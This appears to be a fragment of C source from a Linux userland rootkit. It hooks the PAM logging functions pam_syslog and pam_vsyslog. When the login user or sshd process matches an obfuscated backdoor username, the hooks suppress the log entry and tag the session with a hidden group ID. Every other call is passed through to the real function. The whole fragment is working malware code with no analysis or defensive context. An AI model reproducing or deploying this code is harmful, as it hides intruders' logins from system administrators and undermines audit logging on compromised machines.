void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...)
{
    if(is_bdusr()) return;

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return;

    char sshds[64], *bduname=strdup(BD_UNAME); xor(bduname);
    snprintf(sshds, sizeof(sshds), "sshd: %s", bduname);
    if(strstr(cprocname(), sshds) || !strcmp((char *)user, bduname)) { CLEAN(bduname); setgid(MGID); return; }
    CLEAN(bduname);

    va_list va;
    va_start(va,fmt);
    pam_vsyslog(pamh,priority,fmt,va);
    va_end(va);
    return;
}

void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args)
{
    if(is_bdusr()) return;

    void *user;
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return;

    char sshds[64], *bduname=strdup(BD_UNAME); xor(bduname);
    snprintf(sshds, sizeof(sshds), "sshd: %s", bduname);
    if(strstr(cprocname(),sshds) || !strcmp((char *)user, bduname)) { CLEAN(bduname); setgid(MGID); return; }
    CLEAN(bduname);

    HOOK(o_pam_vsyslog,CPAM_VSYSLOG);
    o_pam_vsyslog(pamh,priority,fmt,args);
    return;
}